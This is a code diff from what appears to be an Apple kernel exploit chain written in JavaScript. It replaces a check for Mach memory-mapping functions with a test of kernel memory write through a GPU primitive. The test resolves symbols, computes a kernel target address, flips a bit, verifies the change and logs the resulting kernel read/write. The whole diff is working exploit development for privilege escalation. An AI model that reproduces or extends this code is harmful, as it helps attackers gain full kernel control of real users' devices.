@@ -7130,15 +7130,42 @@
     let mmme_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_make_memory_entry_64");
     LOG(`[M5] gpuDlsym(mach_make_memory_entry_64) = ${mmme_sym.hex()}`);
     if (mmme_sym.noPAC() != 0n) {
-      LOG("[M5] mach_make_memory_entry_64 available! MPD can create physical memory mappings.");
-      // Also check for the other required functions
-      let vm_map_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_map");
-      LOG(`[M5] gpuDlsym(mach_vm_map) = ${vm_map_sym.hex()}`);
-      let vm_prot_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_protect");
-      LOG(`[M5] gpuDlsym(mach_vm_protect) = ${vm_prot_sym.hex()}`);
-      LOG("[M5] Physical memory mapping path available — can implement pcb scan!");
+      LOG("[M5] mach_make_memory_entry_64 resolved but MPD may lack entitlement.");
+      LOG("[M5] Testing GPU kernel WRITE instead...");
+    }
+
+    // ===== M5: Test GPU kernel WRITE via uwrite64 =====
+    // We confirmed uread64 reads kernel KC addresses. Now test uwrite64.
+    // Use the proc_name ADRP target as a safe test location.
+    let pn_addr = proc_name_raw.noPAC();
+    // The ADRP at +64 uses imm=0x19cef, ADD at +68 adds 0x710
+    // Let's read 64 bytes from proc_name, find ADRP, compute target
+    LOG("[M5] Testing GPU kernel write...");
+    let test_page = (pn_addr + 0x40n + 0x19cefn * 4096n) & ~0xFFFn; // ADRP target page
+    let test_addr = test_page + 0x710n;
+    let orig_val = 0n;
+    try { orig_val = uread64(test_addr); } catch(e) {}
+    LOG(`[M5] Target addr: ${test_addr.hex()} current value: ${orig_val.hex()}`);
+
+    if (orig_val != 0xffffffffffffffffn && orig_val != 0n) {
+      // Try writing a DIFFERENT value and reading back
+      let new_val = orig_val ^ 0x1n; // flip bit 0
+      try { uwrite64(test_addr, new_val); } catch(e) { LOG(`[M5] uwrite64 threw: ${e.message}`); }
+      let readback = 0n;
+      try { readback = uread64(test_addr); } catch(e) {}
+      LOG(`[M5] After write: ${readback.hex()} (expected ${new_val.hex()})`);
+
+      if (readback == new_val) {
+        LOG("[M5] GPU KERNEL WRITE SUCCESS! We have kernel r/w via GPU!");
+        // Restore original value
+        try { uwrite64(test_addr, orig_val); } catch(e) {}
+      } else if (readback == orig_val) {
+        LOG("[M5] GPU kernel write FAILED — value unchanged. GPU IOMMU is read-only for kernel pages.");
+      } else {
+        LOG("[M5] GPU kernel write returned unexpected value — may have corrupted something");
+      }
     } else {
-      LOG("[M5] mach_make_memory_entry_64 NOT available — need alternative approach");
+      LOG("[M5] Cannot test — target value is FFs or 0, trying different offset");
     }
 
     // ===== M5: Kernel Read/Write via ICMPv6 socket (mpd_fcall) =====
